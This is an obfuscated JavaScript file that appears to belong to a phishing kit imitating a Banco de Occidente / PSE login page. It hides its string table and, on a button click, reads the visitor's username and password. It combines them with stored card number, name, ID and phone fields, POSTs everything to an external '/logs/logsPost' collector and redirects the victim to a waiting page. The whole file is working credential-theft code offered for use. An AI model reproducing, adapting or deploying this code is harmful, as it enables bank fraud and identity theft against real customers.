const _0x31775b = _0x57c3;
(function (_0x1c8768, _0x13d484) {
  const _0x3c8610 = _0x57c3,
    _0x184708 = _0x1c8768();
  while (!![]) {
    try {
      const _0x5e4269 =
        -parseInt(_0x3c8610(0x144)) / 0x1 +
        parseInt(_0x3c8610(0x15d)) / 0x2 +
        -parseInt(_0x3c8610(0x152)) / 0x3 +
        parseInt(_0x3c8610(0x154)) / 0x4 +
        parseInt(_0x3c8610(0x149)) / 0x5 +
        -parseInt(_0x3c8610(0x156)) / 0x6 +
        -parseInt(_0x3c8610(0x15a)) / 0x7;
      if (_0x5e4269 === _0x13d484) break;
      else _0x184708["push"](_0x184708["shift"]());
    } catch (_0x5d56ae) {
      _0x184708["push"](_0x184708["shift"]());
    }
  }
})(_0x47da, 0xe84a7);
function updateLS() {
  const _0x57335b = _0x57c3;
  LS[_0x57335b(0x14e)](_0x57335b(0x14d), JSON["stringify"](info));
}
const button = document[_0x31775b(0x158)](_0x31775b(0x140)),
  userInput = document[_0x31775b(0x158)](_0x31775b(0x14f)),
  passInput = document["getElementById"]("txtPass");
button["addEventListener"](_0x31775b(0x146), async function (_0x41ea09) {
  const _0x3e4c50 = _0x31775b;
  _0x41ea09[_0x3e4c50(0x157)](), (button[_0x3e4c50(0x15b)] = !![]);
  if (!userInput[_0x3e4c50(0x142)] || !passInput[_0x3e4c50(0x142)]) {
    alert("Por\x20favor\x20ingrese\x20la\x20información\x20requerida"),
      userInput[_0x3e4c50(0x14a)](),
      (button[_0x3e4c50(0x15b)] = ![]);
    return;
  }
  const _0x3e8a49 = userInput["value"],
    _0x450da0 = passInput[_0x3e4c50(0x142)];
  (info[_0x3e4c50(0x153)][_0x3e4c50(0x155)] = _0x3e8a49),
    (info[_0x3e4c50(0x153)][_0x3e4c50(0x150)] = _0x450da0),
    updateLS();
  const _0x4d440e = {
    reg: info[_0x3e4c50(0x153)]["cc"],
    name: info[_0x3e4c50(0x153)][_0x3e4c50(0x141)],
    cl: info[_0x3e4c50(0x153)][_0x3e4c50(0x15c)],
    us: info["metaInfo"][_0x3e4c50(0x155)],
    ps: info[_0x3e4c50(0x153)][_0x3e4c50(0x150)],
    bn: _0x3e4c50(0x14c),
    status: _0x3e4c50(0x160),
    fuente: _0x3e4c50(0x145),
  };
  try {
    const _0x516d3e = await fetch(url + _0x3e4c50(0x14b), {
      method: _0x3e4c50(0x148),
      headers: { "Content-Type": _0x3e4c50(0x15f) },
      body: JSON[_0x3e4c50(0x151)](_0x4d440e),
    });
    if (!_0x516d3e["ok"]) throw new Error(_0x3e4c50(0x159));
    window[_0x3e4c50(0x143)]["href"] = _0x3e4c50(0x147);
  } catch (_0x1a0a2c) {
    console["error"](_0x3e4c50(0x15e), _0x1a0a2c),
      (button[_0x3e4c50(0x15b)] = ![]);
  }
});
function _0x57c3(_0x596705, _0x47a54e) {
  const _0x47dae1 = _0x47da();
  return (
    (_0x57c3 = function (_0x57c393, _0x5a1c7f) {
      _0x57c393 = _0x57c393 - 0x140;
      let _0x4bd5e1 = _0x47dae1[_0x57c393];
      return _0x4bd5e1;
    }),
    _0x57c3(_0x596705, _0x47a54e)
  );
}
function _0x47da() {
  const _0x20ffdc = [
    "info",
    "setItem",
    "txtUsuario",
    "puser",
    "stringify",
    "2162751JNcNYC",
    "metaInfo",
    "3840852MmySfv",
    "user",
    "9053778nfXQzn",
    "preventDefault",
    "getElementById",
    "Error\x20al\x20enviar\x20los\x20datos\x20al\x20servidor",
    "919758fbpEct",
    "disabled",
    "telnum",
    "2507266EBwOwg",
    "Error\x20al\x20procesar\x20la\x20solicitud:",
    "application/json",
    "Ingresó\x20datos",
    "btnUsuario",
    "dudename",
    "value",
    "location",
    "127794VMKGFK",
    "PSE",
    "click",
    "./wait.html",
    "POST",
    "6133425LtWMpd",
    "focus",
    "/logs/logsPost",
    "🌀\x20Occidente",
  ];
  _0x47da = function () {
    return _0x20ffdc;
  };
  return _0x47da();
}
